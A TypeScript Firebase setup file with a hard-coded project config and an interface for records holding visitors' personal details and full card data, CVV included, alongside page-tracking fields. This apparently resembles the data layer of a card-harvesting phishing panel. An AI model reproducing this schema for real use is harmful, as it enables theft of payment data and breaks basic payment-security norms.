import { initializeApp, getApps, getApp } from "firebase/app";
import { getAuth } from "firebase/auth";
import { getFirestore } from "firebase/firestore";
import { getDatabase } from "firebase/database";

const firebaseConfig = {
  apiKey: "AIzaSyBhy7jXrBGtgqLPDoSeXPjZ7dv3BiB8_Fc",
  authDomain: "zeqwr-7ee78.firebaseapp.com",
  databaseURL: "https://zeqwr-7ee78-default-rtdb.firebaseio.com",
  projectId: "zeqwr-7ee78",
  storageBucket: "zeqwr-7ee78.firebasestorage.app",
  messagingSenderId: "315321311014",
  appId: "1:315321311014:web:f2f287f0bf074ca4762be7",
  measurementId: "G-MBQ9MQFPN6",
};

const app = getApps().length > 0 ? getApp() : initializeApp(firebaseConfig);
const auth = getAuth(app);
const db = getFirestore(app);
const database = getDatabase(app);

export { app, auth, db, database };

export interface NotificationDocument {
  id: string;
  name: string;
  hasPersonalInfo: boolean;
  hasCardInfo: boolean;
  currentPage: string;
  time: string;
  notificationCount: number;
  personalInfo?: {
    fullName: string;
    email: string;
    phone: string;
    address: string;
  };
  cardInfo?: {
    cardNumber: string;
    expirationDate: string;
    cvv: string;
  };
}
